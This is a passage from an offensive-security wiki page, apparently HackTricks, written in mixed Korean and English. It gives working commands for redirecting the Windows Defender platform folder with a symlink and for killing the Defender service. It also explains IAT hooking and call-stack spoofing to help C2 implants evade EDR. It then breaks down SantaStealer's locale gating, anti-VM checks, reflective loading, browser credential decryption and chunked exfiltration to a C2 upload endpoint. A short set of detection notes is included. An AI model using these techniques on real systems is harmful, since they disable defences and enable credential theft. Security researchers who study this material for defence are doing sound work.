robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 상위 버전 디렉터리 symlink를 생성해 자신의 폴더를 가리키게 한다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) 리디렉션된 경로에서 MsMpEng.exe (WinDefend)가 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 드롭/교체하여 Defender의 프로세스에서 코드를 실행합니다. 위 섹션을 참조: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink을 제거하면 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작하지 못합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 주의: 이 기술 자체만으로는 privilege escalation을 제공하지 않으며, admin rights가 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams can move runtime evasion out of the C2 implant and into the target module itself by hooking its Import Address Table (IAT) and routing selected APIs through attacker-controlled, position‑independent code (PIC). This generalises evasion beyond the small API surface many kits expose (e.g., CreateProcessA), and extends the same protections to BOFs and post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
노트
- 패치는 relocations/ASLR 이후이자 import의 첫 사용 이전에 적용하세요. Reflective loaders like TitanLdr/AceLdr는 로드된 모듈의 DllMain 동안 후킹을 수행함을 보여줍니다.
- 래퍼는 작고 PIC-safe로 유지하세요; 진짜 API는 패치하기 전에 캡처한 원래의 IAT 값이나 LdrGetProcedureAddress를 통해 해결하세요.
- PIC에 대해 RW → RX 전환을 사용하고 writable+executable 페이지를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 가짜 호출 체인(정상 모듈로 향하는 리턴 주소)을 구성한 후 실제 API로 피벗합니다.
- 이는 Beacon/BOFs에서 민감한 APIs로 향하는 정형화된 스택을 전제로 하는 탐지를 무력화합니다.
- API prologue 이전에 예상되는 프레임 내부로 진입하기 위해 stack cutting/stack stitching 기법과 결합하세요.

운영 통합
- reflective loader를 post‑ex DLLs 앞에 추가하여 DLL이 로드될 때 PIC 및 훅이 자동으로 초기화되게 하세요.
- Aggressor script를 사용해 대상 API를 등록하면 Beacon 및 BOFs가 코드 변경 없이 동일한 회피 경로의 이득을 투명하게 얻을 수 있습니다.

탐지/DFIR 고려사항
- IAT 무결성: non‑image (heap/anon) 주소로 해석되는 엔트리; import 포인터의 주기적 검증.
- 스택 이상: 로드된 이미지에 속하지 않는 리턴 주소; non‑image PIC로의 갑작스러운 전환; 일관되지 않은 RtlUserThreadStart 계보.
- 로더 텔레메트리: 프로세스 내부에서의 IAT 쓰기, import thunks를 수정하는 초기 DllMain 활동, 로드 시 생성되는 예기치 않은 RX 영역.
- Image‑load 회피: LoadLibrary*를 후킹하는 경우, memory masking events와 연관된 automation/clr assemblies의 의심스러운 로드를 모니터링하세요.

관련 빌딩 블록 및 예제
- 로드 중에 IAT 패칭을 수행하는 Reflective loaders (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) 및 stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer)는 현대의 info‑stealers가 AV bypass, anti‑analysis 및 credential access를 단일 워크플로우로 결합하는 방식을 보여줍니다.

### Keyboard layout gating & sandbox delay

- 설정 플래그 (`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 키보드 레이아웃을 열거합니다. 키릴 레이아웃이 발견되면 샘플은 빈 `CIS` 마커를 드롭하고 스틸러를 실행하기 전에 종료하여 제외된 로케일에서 결코 실행되지 않으면서 헌팅 아티팩트를 남깁니다.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하면서 각 이름을 사용자 지정 롤링 체크섬으로 해시하고, debuggers/sandboxes용 임베디드 블록리스트와 비교한다; 또한 컴퓨터 이름에 대해 체크섬을 반복하고 `C:\analysis` 같은 작업 디렉터리를 검사한다.
- Variant B는 시스템 속성(process-count floor, recent uptime)을 검사하고 `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox 추가 요소를 탐지하며, sleep 주위의 타이밍 체크로 single-stepping을 탐지한다. 어떤 탐지라도 있으면 모듈이 실행되기 전에 중단된다.

### Fileless helper + double ChaCha20 reflective loading

- 주된 DLL/EXE는 Chromium credential helper를 임베디드하며, 이는 디스크로 드롭되거나 메모리에 수동 매핑(manually mapped)된다; fileless 모드에서는 imports/relocations를 자체 해결하여 헬퍼 아티팩트가 파일로 남지 않는다.
- 해당 헬퍼는 ChaCha20으로 두 번 암호화된 second-stage DLL을 저장한다(두 개의 32-바이트 키 + 12-바이트 논스). 두 번의 패스 후에는 blob을 reflectively 로드( `LoadLibrary` 사용 안 함)하고 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 exports인 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`를 호출한다.
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 라이브 Chromium 브라우저에 인젝션하고, AppBound Encryption 키를 상속받아 ABE hardening에도 불구하고 SQLite 데이터베이스에서 바로 비밀번호/쿠키/신용카드를 복호화한다.


### 모듈식 in-memory 수집 및 chunked HTTP exfil

- `create_memory_based_log`는 전역 `memory_generators` function-pointer 테이블을 반복(iterates)하며, 활성화된 각 모듈(Telegram, Discord, Steam, screenshots, documents, browser extensions, 등)마다 하나의 스레드를 생성한다. 각 스레드는 결과를 공유 버퍼에 쓰고 약 45s의 조인 창 후에 파일 수를 보고한다.
- 작업이 끝나면 모든 결과를 statically linked `miniz` 라이브러리로 `%TEMP%\\Log.zip`으로 압축한다. `ThreadPayload1`은 15s 동안 sleep한 다음 아카이브를 10 MB 청크로 나누어 HTTP POST로 `http://<C2>:6767/upload`에 스트리밍하며 브라우저 `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 스푸핑한다. 각 청크는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`를 추가하고, 마지막 청크에는 `complete: true`를 붙여 C2가 재조립이 완료되었음을 알 수 있게 한다.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
